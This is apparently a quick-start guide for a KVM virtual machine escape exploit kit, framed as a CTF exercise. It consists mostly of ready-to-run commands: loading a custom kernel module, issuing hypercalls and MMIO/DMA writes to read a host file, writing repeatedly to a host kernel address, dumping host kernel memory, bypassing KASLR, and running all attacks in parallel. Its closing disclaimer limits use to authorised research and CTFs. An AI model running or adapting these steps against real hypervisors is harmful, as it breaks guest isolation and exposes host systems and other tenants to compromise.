# KVM Host Escape Exploitation - Quick Start Guide

## 🎯 Objectives

| Objective | Target | Action | Iterations |
|-----------|--------|--------|------------|
| **A** | `/root/host_rce` (HOST) | Read file from host filesystem | - |
| **B** | `0xffffffff826279a8` | Write `0xdeadbeef41424344` | 250,000 |
| **C** | `0xffffffff82b5ee10` | Read host memory | 50k-100k |

## 📋 Prerequisites

```bash
# 1. Compile kernel module
cd /path/to/exploit
make

# 2. Compile userspace prober
gcc -o kvm_prober kvm_prober.c

# 3. Load kernel module
sudo insmod kvm_probe_drv.ko

# 4. Verify device exists
ls -la /dev/kvm_probe_*
```

## 🚀 Quick Execution

### Method 1: Master Orchestrator (Recommended)
```bash
sudo ./exploit_orchestrator.sh
```

This will:
- Run pre-flight checks
- Execute all objectives automatically
- Generate detailed logs
- Provide comprehensive summary

### Method 2: Python Exploit
```bash
sudo python3 targeted_host_escape.py
```

### Method 3: Bash Script
```bash
sudo ./advanced_mmio_scanner.sh
```

## 🔧 Manual Exploitation

### Objective A: Read Host File

#### Method 1: Hypercall-based (HC 102)
```bash
# Allocate shared buffer
kvm_prober alloc_shared
# Output: Shared buffer allocated at GPA: 0x<addr>

# Write filepath to buffer
echo -n "/root/host_rce" | xxd -p | tr -d '\n'
# Output: 2f726f6f742f686f73745f726365

kvm_prober writegpa <shared_gpa> 2f726f6f742f686f73745f72636500

# Execute hypercall 102: READ_HOST_FILE
kvm_prober hypercall 102 <shared_gpa> <shared_gpa+0x100> 4096 0

# Read result
kvm_prober read_shared <size>
```

#### Method 2: MMIO BAR Technique
```bash
# Try different IVSHMEM BARs
for bar in 0xfebf0000 0xfebf1000 0xfec00000; do
    # Write filepath
    kvm_prober writemmio_buf $bar $(echo -n "/root/host_rce" | xxd -p)
    
    # Trigger read (offset +0x10)
    kvm_prober writemmio_buf $((bar + 0x10)) 0000000000000001
    
    # Read data (offset +0x1000)
    kvm_prober readmmio_buf $((bar + 0x1000)) 4096
done
```

#### Method 3: Namespace Escape (HC 103)
```bash
kvm_prober hypercall 103 <path_gpa> <dest_gpa> 1 0
# arg2=1: escape mount namespace
```

### Objective B: Mass Write Attack

#### Method 1: Hypercall Loop (HC 100)
```bash
#!/bin/bash
TARGET=0xffffffff826279a8
VALUE=0xdeadbeef41424344

for ((i=0; i<250000; i++)); do
    kvm_prober hypercall 100 $TARGET $VALUE 0 0
    [ $((i % 10000)) -eq 0 ] && echo "Progress: $i writes"
done
```

#### Method 2: MMIO DMA Controller
```bash
# Configure DMA
kvm_prober writemmio_buf 0xfe800000 $(printf '%016x' 0xffffffff826279a8)  # Dest addr
kvm_prober writemmio_buf 0xfe800008 deadbeef41424344                       # Value
kvm_prober writemmio_buf 0xfe800010 0001869f                               # Count (100k)
kvm_prober writemmio_buf 0xfe800018 00000001                               # Trigger

# Check status
kvm_prober readmmio_buf 0xfe80001c 4
```

#### Method 3: GPA Remapping
```bash
#!/bin/bash
GUEST_OFFSET=0x64279a8
VALUE=deadbeef41424344

for ((i=0; i<250000; i++)); do
    kvm_prober writegpa $GUEST_OFFSET $VALUE
    [ $((i % 10000)) -eq 0 ] && echo "Progress: $i writes"
done
```

### Objective C: Mass Read Attack

#### Method 1: Hypercall Read Loop (HC 101)
```bash
#!/bin/bash
TARGET=0xffffffff82b5ee10
SHARED_GPA=$(kvm_prober get_shared_gpa | grep -oP '0x[0-9a-f]+')
OUTPUT_FILE=read_samples.hex

for ((i=0; i<100000; i++)); do
    # Hypercall 101: READ(src, dest_gpa, size)
    kvm_prober hypercall 101 $TARGET $SHARED_GPA 64 0
    
    # Save sample
    kvm_prober read_shared 64 >> $OUTPUT_FILE
    
    [ $((i % 10000)) -eq 0 ] && echo "Progress: $i reads"
done

# Analyze
cat $OUTPUT_FILE | xxd -r -p | strings | head -20
```

#### Method 2: MMIO Scan
```bash
GUEST_OFFSET=0x695ee10

for ((i=0; i<100000; i++)); do
    kvm_prober readmmio_buf $GUEST_OFFSET 64 >> read_samples.hex
done
```

#### Method 3: GPA Mass Read
```bash
for ((i=0; i<100000; i++)); do
    kvm_prober readgpa 0x695ee10 64 >> read_samples.hex
done
```

## 📊 Monitoring & Analysis

### Real-time Monitoring
```bash
# Watch kernel logs
sudo dmesg -w | grep kvm_probe

# Monitor hypercalls
sudo dmesg | grep HYPERCALL

# Check device status
cat /proc/devices | grep kvm_probe
```

### Post-Exploitation Analysis
```bash
# Analyze read samples
cat read_samples.hex | xxd -r -p | strings | sort -u

# Find kernel pointers
cat read_samples.hex | while read hex; do
    addr="${hex:0:16}"
    [[ "$addr" =~ ^ffff[8-9a-f] ]] && echo "Kernel pointer: 0x$addr"
done

# Extract unique data
sort -u read_samples.hex > unique_samples.hex
wc -l unique_samples.hex
```

## 🔍 Debugging

### Common Issues

**Issue**: `/dev/kvm_probe_*` not found
```bash
# Check module loaded
lsmod | grep kvm_probe

# Load manually
sudo insmod kvm_probe_drv.ko

# Check dmesg for errors
sudo dmesg | tail -20
```

**Issue**: IOCTL failures
```bash
# Test basic functionality
kvm_prober readport c050 1

# Check permissions
ls -la /dev/kvm_probe_*
sudo chmod 666 /dev/kvm_probe_*
```

**Issue**: Hypercalls return 0xffffffffffffffff
```bash
# This is expected for unsupported hypercalls
# Try different hypercall numbers: 100, 101, 102, 103

# Check if KVM is active
cat /proc/cpuinfo | grep -i vmx  # Intel
cat /proc/cpuinfo | grep -i svm  # AMD
```

**Issue**: No data from host memory reads
```bash
# Verify KASLR slide
kvm_prober getkaslr

# Adjust addresses with KASLR offset
# Host base = 0xffffffff81000000 + slide

# Try scanning around target addresses
for offset in {0..100..10}; do
    kvm_prober readmmio_buf $((0x695ee10 + offset)) 64
done
```

## 📈 Success Metrics

### Objective A (Read Host File)
- ✅ Success: File content retrieved
- ⚠️ Partial: Some data retrieved
- ❌ Failed: No data retrieved

### Objective B (Mass Write)
- ✅ Success: ≥125,000 writes (50%)
- ⚠️ Partial: 50,000-124,999 writes (20-49%)
- ❌ Failed: <50,000 writes

### Objective C (Mass Read)
- ✅ Success: ≥50,000 samples
- ⚠️ Partial: 25,000-49,999 samples
- ❌ Failed: <25,000 samples

## 🎯 Advanced Techniques

### KASLR Bypass
```bash
# Get host kernel base
KASLR_SLIDE=$(kvm_prober getkaslr)
HOST_BASE=$((0xffffffff81000000 + 0x$KASLR_SLIDE))

echo "Host kernel base: 0x$(printf '%x' $HOST_BASE)"

# Adjust target addresses
TARGET_WRITE=$((HOST_BASE + 0x1279a8))
TARGET_READ=$((HOST_BASE + 0x1b5ee10))
```

### Persistent Shared Buffer
```bash
# Allocate once, reuse for all operations
SHARED_GPA=$(kvm_prober alloc_shared | grep -oP '0x[0-9a-f]+')

# Use for all hypercalls
kvm_prober hypercall 102 $SHARED_GPA $((SHARED_GPA + 0x100)) 4096 0
kvm_prober hypercall 101 0xffffffff82b5ee10 $SHARED_GPA 64 0
```

### Parallel Exploitation
```bash
# Run multiple attack vectors simultaneously
./objective_a.sh &
./objective_b.sh &
./objective_c.sh &

wait
echo "All attacks completed"
```

## 📝 Logs & Output

All scripts generate detailed logs in timestamped directories:
- `exploit_logs_YYYYMMDD_HHMMSS/master.log` - Main orchestrator log
- `exploit_logs_YYYYMMDD_HHMMSS/objective_a_*.log` - Objective A attempts
- `exploit_logs_YYYYMMDD_HHMMSS/read_samples.hex` - Raw read data
- `exploit_logs_YYYYMMDD_HHMMSS/strings_found.txt` - Extracted strings

## 🔐 Security Notes

⚠️ **Warning**: These tools are for authorized security research and CTF challenges only.

- Always run in isolated/sandboxed environment
- Kernel module has full system privileges
- Can cause system instability if misused
- Clean up after testing: `sudo rmmod kvm_probe_drv`

## 📚 Additional Resources

- Kernel module source: `kvm_probe_drv.c`
- Userspace tool: `kvm_prober.c`
- Python exploit: `targeted_host_escape.py`
- Bash exploit: `advanced_mmio_scanner.sh`
- Master script: `exploit_orchestrator.sh`